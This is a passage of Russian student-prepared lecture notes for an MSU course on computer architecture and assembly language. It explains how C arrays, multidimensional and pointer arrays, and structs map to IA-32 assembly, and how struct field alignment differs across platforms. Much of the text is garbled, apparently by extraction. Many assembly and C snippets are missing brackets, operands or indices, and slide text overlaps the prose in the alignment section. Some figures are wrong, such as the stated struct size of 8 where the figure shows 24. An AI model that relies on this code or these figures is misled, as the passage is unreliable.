переменная tmp, которая объявлена внутри тела функции:
int f() {
int* tmp ;…
;
}
   Будем считать, что переменная tmp была сохранена сразу
под сохраненным ebp (рис. 8.8). Тогда взятие адреса (*tmp;)
соответствует
mov eax , [ebp -4]
                                                                 Рис. 8.8: Иллюстрация
mov eax , [ eax ]
                                                                 к объяснению
Операция &tmp соответствует
mov eax , ebp
sub eax , 4
Есть способ определить указанный адрес одной командой:
lea eax , [ebp -4]


Массивы
   Во время объявления массива одновременно происходит два процесса. Выделяется
непрерывно идущая последовательность байт, каждый следующий элемент идет сразу
за предыдущим. При этом происходит связывание имени массива с адресом первого
элемента. Общий размер массива – произведение его длины на байтовый размер каждого
элемента. Отметим, что в терминах языка Си есть совместимые типы. Например,
рассмотрим массив элементов типа T, размер массива – L. Этот массив располагается
в непрерывном блоке памяти размером L * sizeof(T) байт. Идентификатор A может
использоваться как указатель на элемент массива с индексом 0. Тип указателя – T*.




                                       115
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 9. Многомерные массивы.
Массивы
   Пусть есть некий массив A размера L с элементами типа T: A[L]. Это означает, что на
уровне ассемблера была заведена метка, под нее зарезервирована память:
A res L*< sizeof T>
Мы можем работать с данным базовым адресом, после которого данные тянутся
последовательно. Для обозначения адреса памяти будем использовать нотацию: 𝜒 𝐴 –
адрес А. Конструкция 𝑀 [...] – обращение к памяти. Рассмотрим следующие массивы
(массивы переменных int и short и статический указатель):
int E [...];
short S [...];
static int *p;
Будем считать, что само значение расположено в eax, а базовый адрес массива – в edx, а в
ecx – некоторая вспомогательная переменная. Заполним следующую таблицу (рис. 9.1):




                                  Рис. 9.1: Иллюстрация к объяснению

   Первое выражение – переменная Е, массив. По сути его можно рассматривать как
указатель (с некоторыми допущениями). Согласно принятой нотации, в этом случае
значение – 𝜒𝐸 . Результат должен оказаться в EAX, значение адреса лежит в EDX,
поэтому необходимо сделать пересылку. Во втором случае (𝐸 [0]) в ассемблерном коде
добавляются квадратные скобки (так как базовый адрес – адрес нулевого элемента).
В случае E[i] в качестве значения нужно указать 𝑀 [ 𝜒𝐸 + 4 ∗ 𝑖], так как адресная
арифметика на уровне ассемблера выражается в том, что мы сами должны определять
размер типа и явно домножать, чтобы получать байтовое смещение. Аналогично для
ассемблерного кода. В случае указателя р имеем тип int*, поэтому и значение – 𝑀 [ 𝜒 𝑝 ].
Для ассемблерного кода обращаемся к участку памяти, где расположена статическая
переменная р: MOV EAX, [p]. Отметим, что ранее мы ввели нотацию, которая явно


                                                 116
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




определяет то, как мы будем что-то воспринимать. Так, в языке Си под р будет
пониматься имя переменной и ее значение, а в ассемблере под р мы будем понимать
адрес. Контекстуально это одно и то же, но в зависимости от того, куда мы помещаем
р, смысл может меняться. В данном случае точно имеется в виду, что для получения
значения Си-выражения типа р мы обращаемся в память по адресу, связанным с этим
именем. Рассмотрим случай &𝑆[𝑖]. В данном случае имеем тип short* (так как чтение
выражения с учетом приоритета операций происходит следующим образом: сначала
рассматриваем имя переменной, потом получаем i-й элемент, далее берем адрес от этого
элемента). Далее берем адрес, который определяется базовым адресом переменной и
прибавляем к нему 2*i. Это можно выразить одной командой – LEA.


Две обратные задачи
    Рассмотрим две задачи. Даны два фрагмента кода – функции с типовыми прологами
и эпилогами. Нужно заполнить пропуски для Си-кода. Первый код:
f:
                    ...
                    mov edx , dword ebp +
                    movsx ax , byte [a + edx
                    mov word [b + edx + edx ], ax
                    ...
     Си-код:
_____________ a[N];
_____________ b[N];

void f( ________i ){
         ______________ ;
}
Вторая задача:
g:
                    ...
                    mov edx , dword ebp + 8
                    movzx eax , word [c + edx + edx ]
                    mov byte [d + edx ], al
                    ...
     Си-код:
_____________ c[N];



                                          117
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




_____________ d[N];

void g( ________i ){
         ______________ ;
}
В обоих случаях есть некоторые статические массивы, так как в указанных трех командах
используются имена, это означает, что иметь есть базовые адреса, откуда идут эти
массивы, расположенные в статической памяти. Таким образом, определить тип. Пусть
размерность известна. Также указано ключевое слово dword, соотвественно, речь идет о
32-разрядном типе. Будем считать, что это тип int (это не будет ничему противоречить).
Таким образом, в обоих случаях 𝐸 𝐷 𝑋𝑖 . Далее берем базовый адрес, прибавляем к нему
переменную i, знаковым образом расширяем до двух байт и отправляем в то место,
которое уже связано с массивом b. Отметим, что так как в коде был указан байт, речь
идет о типе char. Таким образом, имеем
signed    char a[N];
          short b[N];
unsigned short [N ];
          char d[N];
b[i]=a[i]
   Рассмотрим вторую часть кода. Здесь есть беззнаковое двухбайтное обращение к
массиву (см. код выше). Далее расширяем до четырех байт, отсекаем последние четыре
байта и записываем результат в b. Таким образом, продолжение кода будет следующим:
d[i ]=( char ) c[i]
   Добавим к одномерному массиву еще один уровень. Рассмотрим переменную типа
zip_dig pgh [4]
При этом
   • 𝑧𝑖 𝑝 𝑑 𝑖𝑔 𝑝𝑔ℎ[4] эквивалентно 𝑖𝑛𝑡 𝑝𝑔ℎ[4] [5]

            – Переменная pgh: массив из 4 элементов, расположенных непрерывно в памяти
            – Каждый элемент – массив из 5 int’ов, расположенных непрерывно в памяти

   • Всегда развертывание по строкам (Row-Major) (сначала берем нулевой элемент
     внутренней размерности, непрерывно разворачиваем его, после чего переходим к
     следующему элементу).
Есть две особенности данного рассмотрения. Во-первых, промежутки отсутствуют,
машина гарантированно будет работать, используя ту адресную арифметику для
вычисления смещений, которую мы рассмотрели выше. Во-вторых, не во всех языках
программирования развертывание идет по строкам.


                                           118
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Выделение памяти
   Рассмотрим принципы выделения памяти. Для примера рассмотрим тип
 int **a;
Так как мы рассматриваем указатель, компилятор в данном случае выделит четыре байта.
Этот указатель будет ссылаться на какую-то другую область памяти размером четыре
байта, так как там тоже будет указатель. Далее идет ссылка на конечный тип int, который
тоже где-то выделен (рис. 9.2).
                                          a




                                  Рис. 9.2: Иллюстрация к объяснению

   Далее рассмотрим следующий массив
int b0 [20][20];
В этом случае компилятор гарантированно выделит непрерывный кусок памяти, базовый
адрес будет связан с именем bo, а размер – произведение размерностей на размер типа int
(рис. 9.2).
                                     b0

                                               ...

                                       20*20*sizeof(int)
                                  Рис. 9.3: Иллюстрация к объяснению

   Если же обе размерности будут пропущены:
int b1 [][];
мы получим ошибку: incomplete type. Аналогично получим для случая
int b2 [20][];
Однако, в случае
int b3 [][20];
понятно, что каждый элемент представляет собой 20 int’в. В этом случае выделяется
непрерывный буфер, массив по умолчанию будет создан единичного размера. Рассмотрим
также пример
int* c [];
В этом случае предоставляется четыре байта, которые ссылаются на указатель.


                                                 119
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                             КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                  ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Доступ к строкам
   Если мы берем двумерный массив и пишем конструкцию вида A[i], задав только одно
индексное выражение, то на самом деле таким образом мы обращаемся к строке. В случае
записи значения мы берем базовый адрес и прибавляем к нему величину i, умноженную
на размер элемента и размер типа, то есть 𝜒 𝐴 + 𝑖 ∗ 𝑐 ∗ 𝑠𝑖𝑧𝑒𝑜 𝑓 (𝑇). При этом обращения в
память не происходит, мы вычисляем указатель. Например, в случае размерности пять:
int * get_pgh_zip (int index ){
         return pgh [ index ];
}

# define PCOUNT 4
zip_dig pgh [ PCOUNT ] =
{{1 , 5, 2, 0, 6} ,
{1 , 5, 2, 1, 3 },
{1 , 5, 2, 1, 7 },
{1 , 5, 2, 2, 1 }};
   В подобных случаях удобно использовать команду LEA:
; eax = index
         lea eax , eax + 4 * eax ] ; 5 * index
         lea eax , pgh + 4 * eax ] ; pgh + (20 *
   Рассмотрим случай A[i][j] – появляется второе индексное выражение, то есть
появляется смещение до отдельного элемента внутри строки (рис. 9.4). После этого идёт
обращение в память: 𝑀 [ 𝜒 𝐴 + 𝑖 ∗ 𝑐 ∗ 𝑠𝑖𝑧𝑒𝑜 𝑓 (𝑇) + 𝑗 ∗ 𝑠𝑖𝑧𝑒𝑜 𝑓 (𝑇)].




                                  Рис. 9.4: Иллюстрация к объяснению

   Рассмотрим пример:
int get_pgh_digit int index , int dig )
        return pgh [ index ][
}


                                                 120
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                     ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                      СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Ассемблерный код:
mov
eax   , dword ebp + 8]                                          ; index
lea   eax , eax + 4 * eax ]]                                    ; 5* index
add   eax , dword ebp + 12]                                     ; index + dig
mov   eax , dword pgh + 4 * eax ]]                              ; 4*(5* index + dig )
   В данном случае имеем два формальных параметра. После первой пересылки индекс
отправляется в EAX. С помощью команды LEA мы умножаем его на 5 (число элементов
внутри строки). Далее прибавляет второй индекс (переменная j). Таким образом, процесс
состоит в следующем:

   • pgh [index][ тип int

   • Адрес : 𝑝𝑔ℎ + 20 ∗ 𝑖𝑛𝑑𝑒𝑥 + 4 ∗ 𝑑𝑖𝑔 = 𝑝𝑔ℎ + 4 ∗ (5 ∗ 𝑖𝑛𝑑𝑒𝑥 + 𝑑𝑖𝑔)

   • Вычисление адреса производится как 𝑝𝑔ℎ + 4 ∗ ((𝑖𝑛𝑑𝑒𝑥 + 4 ∗ 𝑖𝑛𝑑𝑒𝑥) + 𝑑𝑖𝑔)

   Рассмотрим массивы указателей. В этом случае данные не обязательно будут
располагаться непрерывно друг за другом. Данная особенность имеет место для данных
верхнего уровня (рис. 9.5). В этом случае указатели идут непрерывно друг за другом.




                                     Рис. 9.5: Иллюстрация к объяснению

   Заметим, что Си-код с двумя индексными выражениями имеет такой же вид, что и
раньше:
int get_univ_digit (int index , int dig )                         {
        return univ [ index ][ dig ];
}
   Но при этом ассемблерный код изменился:
mov   eax ,           dword       [ ebp + 8] ; index
mov   edx ,           dword       [ univ + 4 * eax ] eax ]; p = univ [
mov   eax ,           dword       [ ebp + 12] 12]; dig
mov   eax ,           dword       [ edx + 4 * eax ] ; p[ dig ]


                                                    121
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Здесь появляется два обращения в память. Кратко действия можно описать
следующим образом:

   • Доступ к элементу 𝑀𝑒𝑚 [𝑀𝑒𝑚 [𝑢𝑛𝑖𝑣 + 4 ∗ 𝑖𝑛𝑑𝑒𝑥] + 4 ∗ 𝑑𝑖𝑔]

   • Необходимо выполнить два чтения из памяти:

            – Первое чтение получает указатель на одномерный массив
            – Затем второе чтение выполняет выборку требуемого элемента этого
              одномерного массива


Оптимизация доступа к многомерным массивам.
   Рассмотрим некоторые оптимизации, которые выполняются при работе с
многомерными массивами. Как мы видели выше, взятие элемента массива соответствует
довольно сложному вычислению. В случае циклов подобные вычисления могут
занимать большую часть времени выполнения программы. Данный процесс можно
оптимизировать. Для этого рассмотрим матрицу размера N*N. В случае динамически
задаваемой размерности есть два возможных варианта. Поняв, какими будут размерности,
выделяем одномерный массив и вручную реализуем адресную арифметику:
# define IDX (n, i, j) ((i )*( n )+( j))
/* Get element a[i ][j] */
int vec_ele
         (int n, int *a , int i , int j)
{
         return a[ IDX (n,i,j )];
}
   Также существует некоторое расширение, которое поддерживается в компиляторе gcc.
С его помощью мы можем прямо в объявлении функции указать, что матрица будет
двумерная размера n*n, при этом значение переменной n определяется через другие
параметры:
/* Get element a[i][j] */
int var_ele
  (int n, int a[n][n] n], int i, int j)
        return a[i][j];
}


Обращение к элементу
   Рассмотрим доступ к элементу в случае матрицы 16*16:


                                           122
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




int fix_ele fix_matrix a , int i , int j) {
        return a[i][j];
}
   Ассемблерный код:
mov   edx          , dword        ebp + 12]       ; i
sal   edx          , 6                            ; i *64
mov   eax          , dword        ebp + 16]       ; j
sal   eax          , 2                            ; j*4
add   eax          , dword        ebp + 8]        ; a + j*4
mov   eax          , dword        eax + edx ]     ; *(a + j*4 + i *64)�
   Здесь передаётся три параметра, A, i, j. Они идут по смещению +8, +12, +16
соответственно. Если размеры являются степенями двойки, то правомерно использовать
замену умножением в виде сдвигов. Базовый адрес поступает через параметр, эта
величина неизвестная, поэтому в коже присутствуют два сложения – явное и неявное
(последние две строки ассемблерного кода).

   Рассмотрим матрицу неизвестной размерности. В этом случае появляется параметр n:
int var_ele (int n, int a[n][n], int i, int j){
        return a[i][j];
}
   Из-за него появляется умножение в месте, где определяется смещение строки:
mov edx , dword ebp + 8]                          ; n
sal edx , 2                                       ; n*4
imul edx , dword ebp + 16]                        ; i *n*4
mov eax , dword ebp + 20]                         ; j
sal eax , 2                                       ; j*4
add eax , dword ebp + 12]                         ; a + j*4
mov eax , dword eax + edx ]]                      ; *(a + j*4 + i *n *4)
   Отметим, что само а будет восприниматься как указатель, то есть sizeof(a) = 4. В случае
элемента массива sizeof(a[i]) =4*n.


Оптимизация доступа к элементам массива
   Рассмотрим пример, в котором осуществляется проход по
столбцу. Разложим величины по регистрам (рис. 9.6). Мы
заведём указатель, который будет указывать внутрь общего
массива. А далее мы будем работать с этим указателем,
                                                                       Рис. 9.6: Иллюстрация
                                                                       к объяснению

                                                123
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




переставляя его при переходе на строки. Нам известно, на сколько байт нужно прыгнуть,
чтобы перейти к следующему массив, так как размер массива заранее известен. Си-код:
void fix_column
  ( fix_matrix a , int j, int dest
{
  int i;
  for (i = 0; i < N; i ++)
         dest [i] = i ][j];
}
   Ассемблерный код:
.L8:                             ; loop :
mov eax , dword [ ecx ]          ;* ajp
mov dword [ ebi + 4 * edx ], eax ;
add edx , 1                      ; i++
add ecx , 64                     ; ajp += 4*N
cmp edx , 16                     ; i vs. N
jne .L8                          ; if != , goto loop
   Рассмотрим тело цикла. Указатель на элемент текущего столбца считывается и
помещается в eax. Далее пересылаем его (вторая строка ассемблерного кода). Переход на
следующее место в столбце соответствует прибавлению 64 (четвёртая строка).

   В случае массива неизвестного размера (см. код ниже) нам
потребуется дополнительный регистр, в котором необходимо
держать шаг. Чтобы подготовить все вспомогательные величины,
мы используем почти все доступные нам регистры (рис. 9.7).
void var_column
  (int n, int a[n][n],
                                                                       Рис. 9.7: Иллюстрация
         int j, int * dest )                                           к объяснению
{
  int i;
  for (i = 0; i < n; i ++)
         dest [i] = i ][j];
}
Тогда получаем реализацию:
. L18 :                                    ; loop :
                   mov            eax , dword ecx ]]      ;
                   mov            dword edi + 4 * edx ], eax            ;



                                                124
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                   add            edx , 1       ; i++
                   add            ecx , ebx     ; ajp += 4*n
                   cmp            esi , edx     ; n vs. i
                   jg             . L18         ; if ( >) goto loop
Считываем текущее значения указателя на столбец, пересылаем это в dest[i], увеличиваем
счётчик на единицу и прибавляем к ebx ecx.




                                              125
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 10. Структуры
Повторение
   Рассмотрим следующий двумерный массив:
   Если мы хотим обратиться к его элементу A[I] [j], это эквивалентно обращению в
память:
                     𝑀 [ 𝜒 𝐴 + 𝑐 ∗ 𝑖 ∗ 𝑠𝑖𝑧𝑒𝑜 𝑓 (𝑇) + 𝑗 ∗ 𝑠𝑖𝑧𝑒𝑜 𝑓 (𝑇)        (10.1)

где 𝜒 𝐴 - - базовый адрес (начальное место в памяти).
    Отметим, что один из аспектов эффективности заключается в том, что нет проверок
попадания внутрь диапазона адресов памяти. Например, если взять индекс слишком
большим, то мы вылетаем за одну границу. Можно выделить и за другую границу тоже.
    В некоторых случаях по ассемблерному коду функции, которая работает с двумерным
массивом можно определить его размеры.


Структуры
   Структуры - это ещё один тип данных, который в некоторых вещах похож на
массив. Для размещения в этом типе данных выделяется непрерывный блок памяти,
как и в массиве. Отличие состоит в том, что в массиве все элементы однородные,
а в структуре они могут быть произвольных типов. Элементы в структуре обладают
именами, обращения потом будут происходить по этим именам. Для каждого поля внутри
этого выделенного блока данных выделяется определённое место. Так как размеры типов
данных известны во время компиляции, можно посчитать смещение до того или иного
элемента в структуре от начала.
   Пример объявления структуры в Си:
struct rec {
        int i;
        int j;
        int a [3];
        struct rec *p;
}
   Для этой структуры расположение в памяти будет выглядеть так, как представлено на
рисунке 10.1.

Доступ к полям

   Пусть имеется статическая структура типа rec:
 static struct rec t;



                                        126
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
      }


Архитектура ЭВМ и язык ассемблера                                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
         Расположение в памяти
Падарян Вартан Андроникович
                                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 10.1: Расположение в памяти структуры rec.                      8


Пусть пользователь хочет обратиться к полю t.p. Так как структура статическая, то под неё
выделяется блок в статической памяти, тогда для доступа к полю p, аналогично массиву,
необходимо сместиться от базового адреса:
mov                eax , [t +20]
   В случае указателя на структуру ситуация несильно отличается. Указатель на
структуру хранит в себе базовый адрес, поэтому сначала он считывается. В случае взятия
адреса ситуация снова похожа. Пусть есть код взятия адреса:
static struct rec *x;
static int i;
...
&(x->a[i ]);
   Тогда на ассемблере это будет выглядеть следующим образом:
mov                edx , dword [i]
mov                eax , dword [x]
lea                eax , [eax + 4 * edx + 8]
    То есть, сначала помещается значение индекса i в edx, затем базовый адрес структуры
загружаем в eax. Последняя строка ассемблерного кода вычисляет общее смещение и
определили искомый адрес не обращаясь в память.
    Таким образом, появляется возможность писать более интересный код, работая со
связными списками например.


Выравнивание полей в структурах
   Выравнивание полей в структурах происходит немного сложнее, чем в массивах.
В структурах поля идут не непрерывным потоком, и иногда между ними образуются
промежутки - заполнители. Заполнители - это какое-то количество байт, которое не
используется и присутствует для того, чтобы поля находились на выровненных адресах.
   Правила выравнивания в общем случае следующим образом. Если имеется какой-
то тип данных, для хранения которого требуется k байт, тогда адрес, где данный тип
размещается должен быть кратен числу k. Для структуры:
struct S1 {
        char c;


                                                       127
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                            struct S1 {
     • Невыровненные данные                                                                    char c;
Архитектура ЭВМ и язык ассемблера                                                              int
                                                                             КОНСПЕКТ ПОДГОТОВЛЕН     i[2];
                                                                                                  СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                 ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
        c
Падарян Вартан i[0]
               Андрониковичi[1]                                   v                            double
                                                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ        v;
                                                                                                     НА VK.COM/TEACHINMSU


     p p+1      p+5  p+9                                                     p+17           } *p;
         int i [2];
    • Выровненные
         double v;  данные
} *p;
      – Если примитивный тип данных требует K байт
   Выровненные
      – Адресполя будут выглядеть,
               должен              как наKрисунке 10.2.
                         быть кратен
          c       3 байта               i[0]         i[1]         4 байта                    v
    p+0                           p+4          p+8                         p+16                            p+24

                           Кратно 4                                   Кратно 8

     Кратно 8                                                                                     Кратно 8

                                        Рис. 10.2: Выровненные данные в структуре.

   Общей размер структуры оказывается равным 8.

Причина выравнивания

    Рассмотрим зачем нужно выравнивание. Вспомним машину фон Неймана, но добавим
к процессору, памяти и шине контроллер памяти (mem ctrl). Когда очередная команда
пытается обратится к памяти, она получает исполнительный адрес, и с этого адреса нужно
извлечь какое-то количество байт.
    Рассмотрим кусок памяти в виде массива. Пусть нужно выгрузить из памяти что-то
размером dword с адрема [0xFFF]. Четыре раза обращаться в память неэффективно. Шина
пересылает данные порциями, пусть в данном примере она пересылает их порциями по
4 байта. Эти 4 байта будут считываться не с произвольных адресов, а с кратных четырём.
То есть, 4 байта можно взять от нуля, от четырёх, от восьми и так далее.
    Пусть мы пытаемся считать с невыровненного адреса. Тогда контроллеру памяти
придётся запрашивать два соседних куска по 4 байта из памяти, затем вырезать из
них нужные куски и склеивать. То есть, всё получится, но за два обращения. Память
работает на меньших частотах, чем процессор. Однако, каналов, связывающих память
и контроллер памяти может быть много, тогда данные можно посылать параллельно.
Кроме того, во многих процессорах уже давно не одно ядро. Причём, процессор - это
двумерная структура, с уменьшением числа транзисторов, число ядер растёт чуть ли не
квадратично. В то же время, число каналов связи памяти и контроллера памяти с годами
растёт линейно, из-за этого дисбаланс растёт и образуется так называемое bottleneck. В
наше время можно считать, что в среднем на один канал памяти приходится 2-3 ядра,
которые независимо друг от друга выполняют код. С каждого из этих ядер в любой
момент может прийти запрос на получение данных из памяти, и контроллер может
получить на один канал связи с памятью несколько запросов одновременно, получается
задержка.


                                                            128
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   Таким образом, выравнивание, ценой потери нескольких байт, может существенно
увеличить скорость работы всего компьютера в целом. Современный компилятор
производит выравнивание очень активно.
   Помимо общего требования кратности адресов к выравниванию, на разных
операционных системах соглашения об устройстве исполняемого машинного кода
имеют отличие.
   Правила выравнивания для IA-32:

   • 1 байт: char, ... . Ограничений на биты нет.

   • 2 байта: short, ... . Младший бит адреса должен быть 0.

   • 4 байта: int, long, float, char*, ... . Два младших бита адреса должны быть нулями.

   • 8 байт: double, ... . В данном случае существует различие между Windows и Linux. © 2021 МГУ/ВМК/СП
     В Windows выравнивание происходит таким образом, что младшие три бита адреса
     должны быть нулями. В linux выравнивание происходит по 4 байтной границе, как
                  Различные соглашения о выравнивании
     для int, long, ...

   • 12 байт: long double. Два младших бита должны быть нулями.                                         struct           S1 {
                                                                                                         © 2021 МГУ/ВМК/СП
   • x86-64 или IA-32 Windows:
   Для современных 64 разрядных устройствах всё очень похоже. Отличие char
                                                                      состоитc;
                                                                              в
том, что–адреса
           K = 8,  из-за наличия
                становятся           поляи типа
                           8-ми байтными,           double
                                             что в Windows,                 int i[2];
                                                            что в Linux, выравнивание
                   Различные соглашения о выравнивании
происходит таким образом, что младшие три бита адреса должны быть нулями.   double
                                                                                Также, v;
long double выравнивается по 16-ти битной границе.            struct S1} {*p;
      •   x86-64   или  IA-32  Windows:
   Ранее, на рисунке 10.2 рассматривалось выравнивание структуры charдляc;Windows или
         – K = 8,
         c других
x86-64. Для       из-за наличия
             3 байтасистемi[0]   поля  типа
                           выравниваниеi[1]   double  4 байта
                                         той же структуры        int i[2];
                                                           будет выглядеть    v
                                                                           по-другому.
                                                                 double v;
Примеры
     p+0 представлены
                    p+4 на рисунках 10.3 и ??.
                                  p+8                         p+16                        p+24
                                                              } *p;
             c        3 байта           i[0]          i[1]          4 байта                    v
    • p+0IA-32 Linux
                p+4                            p+8                            p+16                           p+24
        – K = 4; double рассматривается аналогично 4-байтным типам
     •Рис.
        IA-32
           10.3: Linux
          данных Выровненные данные в структуре для x86-64 или IA-32 Windows.
           – K = 4; double рассматривается аналогично 4-байтным типам
             данных
           c 3 байта      i[0]        i[1]                v
    p+0c              3 байта p+4i[0]                p+8
                                                      i[1]           p+12 v                                 p+20
      p+0                         p+4          p+8           p+12                            p+20                               17
                         Рис. 10.4: Выровненные данные в структуре для IA-32 Linux.
                                                                                                                 17

   Помимо выравнивания полей может быть необходимо произвести выравнивание
всей структуры как целого, так как структура может быть вложена в какую-то другую
структуру данных.


                                                             129
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
